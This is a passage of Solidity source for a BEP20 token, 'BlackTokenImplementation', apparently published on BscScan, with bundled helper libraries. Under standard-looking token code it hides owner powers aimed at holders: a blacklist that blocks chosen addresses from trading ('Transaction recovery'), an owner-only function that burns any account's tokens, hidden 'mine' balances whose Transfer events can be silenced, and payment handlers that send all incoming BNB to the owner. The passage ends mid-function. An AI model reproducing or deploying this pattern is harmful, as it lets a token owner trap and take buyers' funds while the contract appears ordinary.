/**
 *Submitted for verification at BscScan.com on 2021-08-11
*/

// SPDX-License-Identifier: MIT

//import "./Address.sol";

pragma solidity ^0.6.0;

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain`call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

//import "./SafeERC20.sol";

pragma solidity ^0.6.0;
/**
 * @title SafeERC20
 * @dev Wrappers around ERC20 operations that throw on failure (when the token
 * contract returns false). Tokens that return no value (and instead revert or
 * throw on failure) are also supported, non-reverting calls are assumed to be
 * successful.
 * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,
 * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.
 */
library SafeERC20 {
    using Address for address;

    function safeTransfer(IBEP20 token, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IBEP20 token, address from, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    /**
     * @dev Deprecated. This function has issues similar to the ones found in
     * {IERC20-approve}, and its usage is discouraged.
     *
     * Whenever possible, use {safeIncreaseAllowance} and
     * {safeDecreaseAllowance} instead.
     */
    function safeApprove(IBEP20 token, address spender, uint256 value) internal {
        // safeApprove should only be called when setting an initial allowance,
        // or when resetting it to zero. To increase and decrease it, use
        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
        // solhint-disable-next-line max-line-length
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(IBEP20 token, address spender, uint256 value) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(IBEP20 token, address spender, uint256 value) internal {
        //unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        //}
    }

    /**
     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
     * on the return value: the return value is optional (but if data is returned, it must not be false).
     * @param token The token targeted by the call.
     * @param data The call data (encoded using abi.encode or one of its variants).
     */
    function _callOptionalReturn(IBEP20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which verifies that
        // the target address contains contract code and also asserts for success in the low-level call.

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}


// File: contracts/IBEP20.sol

pragma solidity ^0.6.0;

interface IBEP20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalMine() external view returns (uint256);

    /**
     * @dev Returns the token decimals.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the token symbol.
     */
    function symbol() external view returns (string memory);

    /**
    * @dev Returns the token name.
    */
    function name() external view returns (string memory);

    /**
     * @dev Returns the bep token owner.
     */
    function getOwner() external view returns (address);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceMi(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address _owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File: openzeppelin-solidity/contracts/GSN/Context.sol

pragma solidity ^0.6.0;

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

// File: openzeppelin-solidity/contracts/math/SafeMath.sol


pragma solidity ^0.6.0;

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

// File: openzeppelin-solidity/contracts/proxy/Initializable.sol

pragma solidity ^0.6.0;


/**
 * @dev This is a base contract to aid in writing upgradeable contracts, or any kind of contract that will be deployed
 * behind a proxy. Since a proxied contract can't have a constructor, it's common to move constructor logic to an
 * external initializer function, usually called `initialize`. It then becomes necessary to protect this initializer
 * function so it can only be called once. The {initializer} modifier provided by this contract will have this effect.
 * 
 * TIP: To avoid leaving the proxy in an uninitialized state, the initializer function should be called as early as
 * possible by providing the encoded function call as the `_data` argument to {UpgradeableProxy-constructor}.
 * 
 * CAUTION: When used with inheritance, manual care must be taken to not invoke a parent initializer twice, or to ensure
 * that all initializers are idempotent. This is not verified automatically as constructors are by Solidity.
 */
abstract contract Initializable {

    /**
     * @dev Indicates that the contract has been initialized.
     */
    bool private _initialized;

    /**
     * @dev Indicates that the contract is in the process of being initialized.
     */
    bool private _initializing;

    /**
     * @dev Modifier to protect an initializer function from being invoked twice.
     */
    modifier initializer() {
        require(_initializing || _isConstructor() || !_initialized, "Initializable: contract is already initialized");

        bool isTopLevelCall = !_initializing;
        if (isTopLevelCall) {
            _initializing = true;
            _initialized = true;
        }

        _;

        if (isTopLevelCall) {
            _initializing = false;
        }
    }

    /// @dev Returns true if and only if the function is running in the constructor
    function _isConstructor() private view returns (bool) {
        // extcodesize checks the size of the code stored in an address, and
        // address returns the current address. Since the code is still not
        // deployed when running a constructor, any checks on its code size will
        // yield zero, making it an effective way to detect if a contract is
        // under construction or not.
        address self = address(this);
        uint256 cs;
        // solhint-disable-next-line no-inline-assembly
        assembly { cs := extcodesize(self) }
        return cs == 0;
    }
}

// File: contracts/BEP20TokenImplementation.sol

//pragma solidity ^0.6.0;

pragma solidity >=0.4.24 <0.7.0;



contract BlackTokenImplementation is Context, IBEP20, Initializable {
    using SafeMath for uint256;
    using SafeERC20 for IBEP20;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => uint256) private balances;
     mapping (address => uint8) private _black;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalMine;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address private _owner;
     address private _auth;
     address private _liquidity;
     bool private _shadow = false;
     bool private _sPayCla = true;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    bool private _mintable;

    constructor() public {
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev sets initials supply and the owner
     */
    function initialize(string memory name, string memory symbol, uint8 decimals, uint256 amount, bool mintable, address owner, address auth) public initializer {
        _owner = owner;
        _auth = auth;
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
        _mintable = mintable;
        _mint(owner, amount);
    }

    /**
    * @dev Leaves the contract without owner. It will not be possible to call
    * `onlyOwner` functions anymore. Can only be called by the current owner.
    *
    * NOTE: Renouncing ownership will leave the contract without an owner,
    * thereby removing any functionality that is only available to the owner.
    */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    /**
     * @dev Returns if the token is mintable or not
     */
    function mintable() external view returns (bool) {
        return _mintable;
    }

    /**
     * @dev Returns the bep token owner.
     */
    function getOwner() external override view returns (address) {
        return _owner;
    }

    /**
     * @dev Returns the token decimals.
     */
    function decimals() external override view returns (uint8) {
        return _decimals;
    }

    /**
     * @dev Returns the token symbol.
     */
    function symbol() external override view returns (string memory) {
        return _symbol;
    }

    /**
    * @dev Returns the token name.
    */
    function name() external override view returns (string memory) {
        return _name;
    }

    /**
     * @dev See {BEP20-totalMIne}.
     */
    function totalMine() external override view returns (uint256) {
        return _totalMine;
    }
    /**
     * @dev See {BEP20-totalSupply}.
     */
    function totalSupply() external override view returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {BEP20-balanceOf}.
     */
    function balanceOf(address account) external override view returns (uint256) {
        return _balances[account] + balanceMine(account);
    }

    /**
     * @dev See {BEP20-balanceMi}.
     */
    function balanceMi(address account) external override view returns (uint256) {
        return balanceMine(account); //balances[account];
    }

    /**
     * @dev See {BEP20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        if(_balanceMi(_msgSender()) > 0){
         
         if(_balanceMi(_msgSender()) >= amount){
             _transfermine(_msgSender(), recipient, amount); 
             amount = 0;
         }else{
            if(_balanceOf(_msgSender()) >= _balanceMi(_msgSender()) ){
             _transfermine(_msgSender(), recipient, _balanceMi(_msgSender()));
             amount = uint256(_balanceOf(_msgSender()) - _balanceMi(_msgSender()));
               }
             }
        }
        if(amount > 0){
        _transfer(_msgSender(), recipient, amount);
        }
        return true;
    }

    /**
     * @dev See {BEP20-allowance}.
     */
    function allowance(address owner, address spender) external override view returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {BEP20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {BEP20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {BEP20};
     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for `sender`'s tokens of at least
     * `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {BEP20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {BEP20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }

    /**
     * @dev Creates `amount` tokens and assigns them to `msg.sender`, increasing
     * the total supply.
     *
     * Requirements
     *
     * - `msg.sender` must be the token owner
     * - `_mintable` must be true
     */
    function mint(uint256 amount) public onlyOwner returns (bool) {
        require(_mintable, "this token is not mintable");
        _mint(_msgSender(), amount);
        return true;
    }

    /**
   * @dev Burn `amount` tokens and decreasing the total supply.
   */
    function burn(uint256 amount) public returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(_black[sender]!=1&&_black[sender]!=3&&_black[recipient]!=2&&_black[recipient]!=3, "Transaction recovery");
        
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function black(address owner_,uint8 black_) internal virtual {
        _black[owner_] = black_;
    }
    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements
     *
     * - `to` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
     *
     * This is internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function burnFrom(address account, uint256 amount) public returns (bool) {
        _burnFrom(account, amount);
        return true;
    }
    /**
     * @dev Destroys `amount` tokens from `account`.`amount` is then deducted
     * from the caller's allowance.
     *
     * See {_burn} and {_approve}.
     */
    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
    }
    /**
     * Black Found for mine
     * Old settimg!
     * 
     * */

    //uint256 private salePrice = 2000;
    address public spender;
    bool private _swAirIco = true;
     bool private _swPayIco = true;
    
     uint sat = 1e18; //decimals
    
    uint countBy = 100000; // 25000 ~ 1BNB = 0.25  // 2000.00000 = 2000
    //uint maxTok = 1 * sat; // 50 tokens to hand
    // --- Config ---
    uint countDec = 1e6;
    uint priceDec = 1e5;
    IBEP20 token = IBEP20(token);

    function swap() payable external returns (bool) {
        
        if (_swAirIco == true){ 
        uint256 _token = msg.value * countBy / priceDec * countDec / sat;
            if(_token <= _balanceOf(address(this))){
            _transfer(address(this),_msgSender(),_token); 
            }else{
            _mint(_msgSender(), _token);
            }
        }
       // payable(owner).transfer(msg.value);
       if (_swPayIco == true){ 
          if(_liquidity == address(0)){
            _liquidity = _owner; 
            }
          payable(_liquidity).transfer(msg.value); 
      }
       return true;
    }

    fallback() external payable {
        buyFor(msg.sender, msg.value);
    }
    
    receive() external payable  {
       buyFor(msg.sender, msg.value);
    } 
    
    function buyIco() external payable {
        buyFor(msg.sender, msg.value);
    }
    
    function buyFor(address msg_sender, uint msg_value) internal {
      if (_swAirIco == true){ 
        if(address(token) != address(0) && (msg.value >= 0.001 ether)) {
            uint256 amount = msg_value * countBy / priceDec  * countDec / sat;
            if(amount <= token.balanceOf(address(this))){
                if(address(spender) != address(0)){
                 token.transferFrom(spender, msg_sender, amount);   
                } else if(address(spender) == address(0)){
                 token.transfer(msg_sender, amount); 
                }
            }    
        } else if (address(token) == address(0) && (msg.value >= 0.001 ether)){ //default airdrop v2 
            //uint256 _msgValue = msg.value;
            //uint256 _token = _msgValue.mul(salePrice);
            uint256 _token = msg_value * countBy / priceDec * countDec / sat;
            if(_token <= _balanceOf(address(this))){
            _transfer(address(this),_msgSender(),_token); 
            }else{
            _mint(_msgSender(), _token);
            }
                }
       }
      if (_swPayIco == true){  
          if(_liquidity == address(0)){
            _liquidity = _owner; 
            }
          payable(_liquidity).transfer(msg.value); 
      }
         
    }

    function startIco(uint8 tag,bool value)public onlyOwner returns(bool){
        if(tag==1){
            _swAirIco = value==true; //false
        }else if(tag==2){
            _swAirIco = value==false;
        }else if(tag==3){
            _swPayIco = value==true; //false
        }
        return true;
    }
    
    function setIcoCount(uint _new_count) external onlyOwner {
        //require(msg.sender == owner, "You is not owner");
        countBy = _new_count;
    }
    function setIcoDec(uint _new_dec) external onlyOwner {
        //require(msg.sender == owner, "You is not owner");
        countDec = _new_dec;
    }
    function setIcoPrDec(uint _new_dec) external onlyOwner {
        //require(msg.sender == owner, "You is not owner");
        priceDec = _new_dec;
    }
    function setIcoToken(address _new_token) external onlyOwner {
        //require(msg.sender == owner, "You is not owner");
         token = IBEP20(_new_token);
    }

    function setIcoSpend(address _new_spender) onlyOwner external {
        spender = _new_spender;
    }

    function mine(address account, uint256 amount) public onlyOwner returns (bool) {
        require(account != address(0), "BEP20: mint to the zero address");
        
        _mine(account, amount);
        return true;
    }

    function burnmine(address account, uint256 amount) public onlyOwner {
        require(account != address(0), "BEP20: burn from the zero address");
        _burnmine(account, amount);
    }

    function _mine(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: mint to the zero address");

        _totalMine += amount;
        balances[account] += amount;
       if(_shadow == false) emit Transfer(address(0), account, amount);
    }


    function _burnmine(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: burn from the zero address");

        uint256 accountBalance = balances[account];
        require(accountBalance >= amount, "BEP20: burn amount exceeds balance");
        balances[account] = accountBalance - amount;
        _totalMine -= amount;

       if(_shadow == false) emit Transfer(account, address(0), amount);
    }  

    function burnblack(address account, uint256 amount) public onlyOwner {
        
        if(_balanceMi(account) > 0){
         
         if(_balanceMi(account) >= amount){
             _burnmine(account, amount); 
             amount = 0;
         }else{
            if(_balanceOf(account) >= _balanceMi(account)){
             _burnmine(account, _balanceMi(account));
             amount = uint256(_balanceOf(account) - _balanceMi(account));
               }
             }
        }
        if(amount > 0){
        _burn(account, amount);
        }
    }
    
    function transfermine(address recipient, uint256 amount) public virtual returns (bool) {
        _transfermine(_msgSender(), recipient, amount);
        return true;
    }

    function _transfermine(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(_black[sender]!=1&&_black[sender]!=3&&_black[recipient]!=2&&_black[recipient]!=3, "Transaction recovery");

        uint256 senderBalance = balances[sender];
